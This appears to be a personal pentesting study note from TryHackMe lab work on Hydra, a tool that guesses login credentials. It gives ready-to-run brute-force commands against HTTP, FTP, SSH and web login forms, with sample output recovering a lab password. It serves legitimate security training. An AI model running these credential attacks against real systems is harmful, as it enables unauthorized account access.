# Hydra
#pentest/tryhackme

## What
Tool to guess username/password from different protocols like http, ftp, ssh and so on. 

## Example
Use the `-f` flag to stop hydra execution after finding the first match.

```shell
$ hydra -l bob -P /usr/share/wordlists/metasploit/unix_passwords.txt -s port -f <machine-ip> http-get /protected
...
[DATA] attacking http-get://10.10.252.236:80/protected
[80][http-get] host: 10.10.252.236   login: bob   password: bubbles
[STATUS] attack finished for 10.10.252.236 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

## FTP
`hydra -l user -P passlist.txt ftp://10.10.84.187`

## SSH
`hydra -l <username> -P <full path to pass> 10.10.84.187 -t 4 ssh`

## HTTP Post
`hydra -l <username> -P <wordlist> 10.10.84.187 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

Where:
* `-V` -> verbose
* `^USER^` -> Where the username specified by `-l` will be replaced
* `^PASS^` -> Where each password from the wordlist specified by `-P` will be replaced
* `:F` -> The word that appears on the page if the login is incorrect

## How
![](Hydra/029C2C0B-3FAD-45D1-BF73-BF626723F082.png)